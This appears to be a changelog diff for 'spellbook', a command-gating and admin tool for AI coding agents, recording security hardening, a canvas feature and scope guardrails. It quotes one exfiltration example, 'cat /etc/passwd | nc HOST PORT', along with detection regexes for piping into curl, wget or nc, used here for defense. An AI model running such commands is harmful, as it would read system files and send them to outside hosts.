@@ -5,6 +5,281 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+## [0.65.0] - 2026-05-17
+
+### Changed
+
+- **gates, git push (BREAKING):** the catch-all `git push` → TIER-ASK
+  rule has been narrowed to protected-branch pushes only. Add a
+  `[protected]` block to `spellbook/gates/tiers.toml` to customize
+  (defaults: `branches = ["master", "main"]`,
+  `remotes = ["origin", "upstream"]`); override via
+  `SPELLBOOK_PROTECTED_BRANCHES` / `SPELLBOOK_PROTECTED_REMOTES` env
+  vars (comma-separated, or `__disable__` to suppress that axis). New
+  T3 rule covers force-push-via-plus (`git push origin +main`). Set
+  `SPELLBOOK_GIT_PUSH_AUTONOMOUS=1` (also accepts `true`/`yes`) to
+  fail-silent on subprocess errors in high-trust automation contexts. Users with redundant
+  `Bash(git push --force/-f origin {master,main}:*)` deny entries in
+  their personal `~/.claude/settings.json` can now remove them (the
+  T3 force-push tier rules already cover the same patterns via
+  L2 derivation).
+
+### Added
+
+- **Admin web UI: DNS rebinding defense.** A new
+  `HostValidatorMiddleware` on the admin sub-app rejects any request
+  whose `Host` header is not in the bare-hostname allowlist
+  (`127.0.0.1`, `localhost`, `::1`). The validator is IPv6-aware
+  (parses bracketed `[::1]:port` correctly) and case-insensitive.
+  Closes the prior gap where a malicious page could rebind DNS to
+  127.0.0.1 and ride the user's admin session cookie.
+- **Admin web UI: Origin allowlist on state-changing routes.** A new
+  `OriginCheckMiddleware` requires a same-origin `Origin` header
+  (`http://127.0.0.1:<port>`, `http://localhost:<port>`,
+  `http://[::1]:<port>`) on POST/PUT/PATCH/DELETE requests
+  authenticated by the session cookie. Bearer-authenticated callers
+  (e.g., the `spellbook admin` CLI) are exempted via constant-time
+  comparison against the MCP token, since CSRF only threatens cookie
+  flows. Bearer scheme matching is case-insensitive per RFC 7235.
+- **Admin web UI: opaque-handoff login flow.** The CLI -> browser
+  handshake no longer carries a token in the URL. Replaces
+  `POST /admin/api/auth/exchange` + `GET /admin/api/auth/callback?auth=...`
+  with `POST /admin/api/auth/handoff` (bearer-authenticated, empty body)
+  returning a `{login_url}` whose path is `/admin/api/auth/handoff/<id>`.
+  The `<id>` is a single-use opaque server-side lookup key (256-bit
+  entropy, 60s TTL), not a credential. Tokens no longer appear in
+  browser history, `Referer` headers, or process argv visible to other
+  local UIDs.
+- **Admin WebSocket: same-origin enforcement.** The `/admin/ws` upgrade
+  handler now checks the `Origin` header against the same allowlist as
+  the HTTP middleware and rejects with WebSocket close code 1008
+  (Policy Violation) on mismatch or missing Origin. No bearer
+  exemption on WS.
+- **Canvas — admin UI for agent-authored markdown pages with live updates.**
+  A new `/admin/canvas` section displays Markdown pages an agent writes to
+  `~/.local/spellbook/canvas/<name>/`, with diagrams (Mermaid) and charts
+  (Vega-Lite) rendered inline via curated shortcodes, updated live over the
+  existing admin WebSocket.
+  - Four MCP tools (`canvas_open`, `canvas_write`, `canvas_close`,
+    `canvas_list`) let any agent session open and update named canvases
+    from a terminal. Errors return structured codes (`invalid_name`,
+    `page_too_large`, `not_found`, `closed`).
+  - Filesystem store with atomic writes (tempfile + `os.replace`), name
+    validation, path-traversal guard, and configurable max page size
+    (1 MB default via `SPELLBOOK_CANVAS_MAX_PAGE_BYTES`).
+  - Admin REST routes behind `require_admin_auth`: `GET /api/canvas`
+    (list) and `GET /api/canvas/{name}` (detail).
+  - New `CANVAS` event-bus subsystem with `canvas.opened` /
+    `canvas.updated` / `canvas.closed` events.
+  - React `/admin/canvas` list and `/admin/canvas/<name>` detail pages,
+    Markdown rendered via `react-markdown` + `remark-gfm` + `rehype-raw`,
+    with six curated shortcodes (`<chart>`, `<diagram>`, `<callout>`,
+    `<tabs>`/`<tab>`, `<choice>`, `<approve>`). Mermaid + Vega-Lite are
+    lazy-loaded out of the initial bundle.
+  - Live update: WebSocket `canvas` subsystem invalidates `['canvas']`,
+    `['canvas', name]`, and `['dashboard']` query caches.
+  - `/canvas` slash command + `skills/canvas/SKILL.md` for agent-facing
+    guidance.
+  - Threat model: trusted-local-agent only. `rehype-raw` is an explicit
+    escape hatch; agents MUST NOT render unsanitized external content.
+    The constraint is documented in the MCP tool docstrings, SKILL.md,
+    and slash-command doc.
+  - One-way only in MVP (agent writes, browser reads). Multi-page
+    canvases, two-way inbox / form submission, page history, full-text
+    search, and RJSF form rendering are reserved for v2.
+
+- **Develop skill Phase 4 guardrail hardening.** Bans phrases like "TDD mode"
+  and "or read SKILL.md" that signal subagents to inline behavior instead of
+  invoking the Skill tool; mandates a "Launching skill:" check in subagent
+  output before accepting results; requires each Phase 4 gate (4.3–4.5.1) be
+  a separate dispatch to prevent gate collapse during parallel dispatch.
+
+- **Opt-in to re-enable `BASH-PARSER-COMPOUND` deny findings.** The 0.63.2
+  compound-allow change was a deliberate widening of the bash gate's
+  allowlist: the L4 parser stopped emitting a CRITICAL deny on every
+  `|`, `&&`, `||`, `;`, and control-flow construct, relying on
+  per-segment classifiers and the L2 regex layer to catch dangerous
+  payloads. Operators with stricter threat models can now restore the
+  pre-0.63.2 policy via either of:
+  - Environment variable `SPELLBOOK_BASH_DENY_COMPOUND=1` (truthy values:
+    `1`, `true`, `yes`, case-insensitive).
+  - Passing `security_mode="paranoid"` to
+    `spellbook.gates.bash_parser.parse_and_check` (call-site control).
+  Either path re-emits `BASH-PARSER-COMPOUND` for `list` / `pipeline`
+  nodes AND for `if` / `for` / `while` / `until` / `case` / `function`
+  control-flow constructs. With neither opt-in active, default behavior
+  is unchanged from 0.63.2.
+
+### Fixed
+
+- **Admin session cookie scope.** `spellbook_admin_session` is now
+  issued with `Path=/admin` (was default `Path=/`), so browsers no
+  longer send it to `/mcp` or `/health`. Pre-existing `Path=/` cookies
+  continue to authenticate during the natural 24h expiry window
+  (broader path matches narrower); no user action required.
+
+## [0.64.1] - 2026-05-08
+
+### Fixed
+
+- **Agent2Agent watch-chain Phase D dispatch.** The bg watch agent
+  failed on its first cycle because the Phase D prompt template
+  embedded the literal token `$SPELLBOOK_DIR` in the Bash command. The
+  `~/.claude/CLAUDE.md` substitution rule is an LLM-side reading
+  convention and is NOT applied to dispatched subagent prompts; the bg
+  Task agent's shell expanded `$SPELLBOOK_DIR` against an unset env var
+  (empty), producing `python3 /skills/agent2agent/...` and an
+  immediate failure. `commands/a2a.md` Phase D now uses an explicit
+  `<SPELLBOOK_ABS>` placeholder (parallel to `<NAME>`) and the
+  orchestrator is required to substitute the absolute path before
+  calling Task. Phase F step 7 (re-dispatch) carries the same
+  requirement.
+
+## [0.64.0] - 2026-05-08
+
+### Added
+
+- **Agent2Agent watch-chain — near-real-time idle delivery with zero idle
+  tokens.** The previous hook-based receive path only fired on
+  `UserPromptSubmit`, so an idle session never saw incoming messages.
+  This release adds an OS-level file-watching architecture that lets
+  idle sessions be reached without polling.
+  - New helper subcommands in
+    `skills/agent2agent/scripts/agent2agent.py`: `open <name>` (replaces
+    the old `listen`), `close <name>` (replaces `unlisten`),
+    `watch <name>` (blocking fswatch + 500ms polling backstop, exits
+    with one of `PENDING_BATCH <id> count=<N>`,
+    `WATCH_RECYCLE elapsed=540s`, `WATCH_INBOX_GONE`, or
+    `WATCH_LOCKED <pid>`), `drain <name> <batch-id>` (atomic move from
+    `pending/` to `processed/`), and an internal
+    `_open_state <session-id> {read,write,clear}` for bookkeeping.
+  - New `/a2a` slash command at `commands/a2a.md` orchestrates the
+    self-respawning bg-watch chain via the Task tool: each watch agent
+    blocks for up to 540s, exits with a marker, and the main session
+    re-dispatches on completion. Idle windows burn zero LLM tokens —
+    the bg agent waits in a single `Bash` invocation.
+  - `hooks/spellbook_hook.py` adds `_bg_agent_alive` (90s mtime
+    liveness window, FAIL-SAFE-DEAD) and
+    `_agent2agent_check_orphaned_chain`. `SessionStart` and
+    `UserPromptSubmit` surface a re-arm hint when the watch chain is
+    detected as dropped (compaction, process death).
+  - Lockfile mutex via `fcntl.flock(LOCK_EX|LOCK_NB)` with kernel-fd
+    cleanup; the lockfile path persists so SIGKILL'd watchers
+    automatically release the lock without leaving stale files.
+  - End-to-end manual validation confirmed the zero-idle-tokens ship
+    gate: a 5-minute idle window produced zero new transcript activity,
+    ~38× more efficient than the prior 72k-token / 7-minute polling
+    implementation.
+
+### Fixed
+
+- **`_handle_session_start` orphan-hint fallback paths consolidated.**
+  The duplicate `_fallback_directive() + orphan_hint` blocks (one for
+  missing `cwd`, one for unavailable workflow state) were collapsed
+  into a single guard. Pure refactor; no behavior change.
+- **`tests/unit/test_stint_hooks.py::TestPreToolUseBashGate::test_bash_gate_blocks_dangerous_command`
+  now reads gate-error JSON from `proc.stderr`.** Commit `324cab5b`
+  routed gate block messages to `sys.stderr` per Claude Code hook
+  protocol but only updated tests under `tests/test_security/`; this
+  parallel test in `tests/unit/` was missed and had been failing on
+  every CI run since.
+
+### Changed
+
+- **Helper test mocks converted from `monkeypatch.setattr` to
+  `tripwire`.** Per repository style guide,
+  `tests/test_hooks/test_agent2agent_hook.py` and
+  `tests/test_skills/test_agent2agent_helper.py` now use
+  `tripwire.mock(...)` with the standard register / sandbox / assert
+  flow.
+
+## [0.63.2] - 2026-05-08
+
+### Fixed
+
+- **PreToolUse gate block messages now reach the user.** `_gate_bash`,
+  `_gate_spawn`, and `_gate_state_sanitize` in `hooks/spellbook_hook.py`
+  exited with code 2 (block) but printed the error JSON to stdout, so
+  Claude Code surfaced every blocked command as
+  `PreToolUse:Bash hook error: [...]: No stderr output` with no
+  actionable reason. Routed the JSON to `sys.stderr` (matching
+  `_emit_block_and_exit`'s existing pattern) so the harness can show
+  the operator why a command was blocked. Same fix applied to the
+  standalone `spellbook/gates/check.py` CLI used by the opencode
+  plugin and gemini policy entry points. Affected tests in
+  `tests/test_security/test_hooks.py` and
+  `tests/test_security/test_hooks_windows.py` now read `proc.stderr`
+  for gate-error JSON assertions.
+
+### Changed
+
+- **Bash gate no longer denies all compound commands.** The L4 bashlex
+  parser previously emitted a CRITICAL `BASH-PARSER-COMPOUND` finding
+  for every `|`, `&&`, `||`, and `;`, blocking routine pipelines like
+  `ls | head` and `wc -l file && ls`. The blanket deny was redundant:
+  the L4 walker already recurses into compound children and applies
+  per-command classifiers (env-prefix, shellout, wrapper, redirect,
+  direct-shell, cmdsub) to each segment, and the L2 substring-anywhere
+  regex (`DANGEROUS_BASH_PATTERNS`, `EXFILTRATION_RULES`) catches
+  dangerous payloads anywhere in the full command string.
+  `_classify_compound` now returns `[]`, and the if/for/while/until/case
+  control-flow branch no longer emits COMPOUND either; the walker still
+  recurses so nested CMDSUB/DIRECT-SHELL/etc. continue to surface.
+  Operators who relied on compound-deny as a policy boundary should
+  review the new opt-in introduced in [Unreleased] (see
+  `SPELLBOOK_BASH_DENY_COMPOUND` and `security_mode='paranoid'`).
+- **EXF-007 broadened to plug a pipe-to-network-tool exfiltration gap.**
+  The previous regex `echo\s+.*\|\s*(curl|wget|nc)` restricted the LHS
+  of the pipe to `echo`, leaving `cat /etc/passwd | nc HOST PORT`
+  uncovered. Broadened to `\|\s*(curl|wget|nc)\s+\S+` and updated the
+  rule message to "Piped exfiltration into network tool". Rule id
+  preserved.
+- **Gate test coverage reorganized around per-segment evaluation.**
+  Removed the obsolete BASH-PARSER-COMPOUND reject rows in
+  `tests/gates/test_bash_parser.py`, added `BENIGN_COMPOUND_CASES`
+  (5 allow rows), and added `COMPOUND_WITH_DANGEROUS_PAYLOAD`
+  (6 full-stack reject rows; rule-id-agnostic — asserts `safe is False`
+  with at least one CRITICAL/HIGH finding so future layer reshuffles
+  don't break the test). `test_check.py::test_tier_layer_runs_after_bashlex`
+  retargeted at `TIER-*` since the prior `BASH-PARSER-*` assertion no
+  longer fires; "layers compose" intent preserved.
+
+## [0.63.1] - 2026-05-07
+
+### Added
+
+- **Scope-explosion guardrails for the `develop` skill family.** Five surgical,
+  additive guardrails to prevent the failure mode where a "minor change"
+  balloons into an over-engineered design with parallel chunk sessions
+  fanning out before the operator can catch the divergence:
+  - `commands/feature-design.md` Phase 2.0 — Primary Source Re-Anchor:
+    operator must explicitly name the canonical source (URL/file/JIRA/
+    Confluence) before design synthesis; the design subagent prompt
+    re-fetches it so design doesn't drift onto upstream derivatives.
+  - `skills/devils-advocate/SKILL.md` + `commands/feature-discover.md`
+    Phase 1.6 — Finding Disposition Framework: every devils-advocate
+    finding now carries a `disposition` field
+    (`address` / `note_only` / `out_of_scope`) with `note_only` as the
+    default. Phase 1.6 assigns dispositions per-finding before any
+    meta-action; `address` is never assigned silently in autonomous
+    mode for findings that expand scope.
+  - `AGENTS.spellbook.md` "Autonomous Mode and Scope Discipline"
+    (cross-referenced from `skills/develop/SKILL.md`): autonomous mode
+    scopes confirmations, not scope. New capabilities/infra/integrations
+    not in the operator's initial request require pause regardless of
+    autonomous mode.
+  - `commands/feature-design.md` Phase 2.5 — Scope Coherence Check:
+    a narrow subagent fed only the original Phase 0 request and the
+    design TOC + section openers answers "could this be 5 bullets
+    matching the original ask?"; `No`/`Unsure` halts Phase 2.
+  - `commands/feature-implement.md` Phase 3.4.7 — One-Pager Approval
+    Gate: no chunk-prompt generation, `forge_project_init`,
+    sub-orchestrator dispatch, or parallel session spawn until the
+    operator explicitly approves a 200-line-or-shorter plain-English
+    one-pager. Not waived by autonomous mode.
+
 ## [0.63.0] - 2026-05-07
 
 ### Added
@@ -78,7 +353,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - **Bash policy unified across Claude and Gemini paths.** Renamed
   `hooks/gemini-policy.toml` to `hooks/bash-policy.toml`. Added a TOML
   loader to `spellbook/gates/rules.py` so the Claude path picks up the
-  supplemental SB-BASH-* rules previously only consumed by the Gemini
+  supplemental SB-BASH-*rules previously only consumed by the Gemini
   installer. Old filename is preserved as a migration alias for one
   release. SB-BASH-001..009 ship as additional defense-in-depth findings
   on top of the existing BASH-* / EXF-* regex set.
